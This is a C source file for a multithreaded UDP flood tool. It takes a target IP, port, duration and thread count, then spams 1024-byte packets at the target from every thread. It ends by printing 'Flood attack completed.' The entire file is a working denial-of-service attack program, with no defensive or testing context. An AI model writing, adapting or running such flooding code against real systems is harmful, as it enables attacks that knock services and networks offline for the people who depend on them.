#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>

#define MAX_PAYLOAD_SIZE 1024

// Function to send UDP packets
void *flood(void *args) {
    char *ip = ((char **)args)[0];
    int port = atoi(((char **)args)[1]);
    int duration = atoi(((char **)args)[2]);
    int sock;
    struct sockaddr_in target;
    char payload[MAX_PAYLOAD_SIZE];
    memset(payload, 'A', sizeof(payload)); // Fill payload with 'A's or modify as needed

    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        return NULL;
    }

    target.sin_family = AF_INET;
    target.sin_port = htons(port);
    if (inet_pton(AF_INET, ip, &target.sin_addr) <= 0) {
        perror("Invalid address/ Address not supported");
        close(sock);
        return NULL;
    }

    time_t start_time = time(NULL);
    while (time(NULL) - start_time < duration) {
        sendto(sock, payload, sizeof(payload), 0, (struct sockaddr *)&target, sizeof(target));
    }

    close(sock);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        fprintf(stderr, "Usage: %s <IP> <PORT> <DURATION> <THREADS>\n", argv[0]);
        return EXIT_FAILURE;
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int threads_count = atoi(argv[4]);
    pthread_t threads[threads_count];

    for (int i = 0; i < threads_count; i++) {
        char *args[3] = {ip, argv[2], argv[3]}; // pass IP, PORT, DURATION
        if (pthread_create(&threads[i], NULL, flood, args) != 0) {
            perror("Failed to create thread");
            return EXIT_FAILURE;
        }
    }

    for (int i = 0; i < threads_count; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("Flood attack completed.\n");
    return EXIT_SUCCESS;
}